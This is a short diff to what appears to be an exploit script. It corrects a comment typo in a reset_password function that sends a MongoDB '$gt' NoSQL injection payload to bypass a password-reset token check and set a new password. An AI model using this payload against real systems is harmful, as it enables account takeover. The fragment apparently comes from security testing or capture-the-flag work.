@@ -31,7 +31,7 @@ def reset_password():
     global jwt_token
     print("[+] Exploiting reset password vulnerability")
     reset_payload = {
-        "code": {"$gt": 0}, 		# MomgoDB command, gives resetToken values greater than (gt) 0 
+        "code": {"$gt": 0}, 		# MongoDB command, gives resetToken values greater than (gt) 0 
         "password": "HackhovenHackhoven1",
         "passwordConfirmation": "HackhovenHackhoven1"
     }
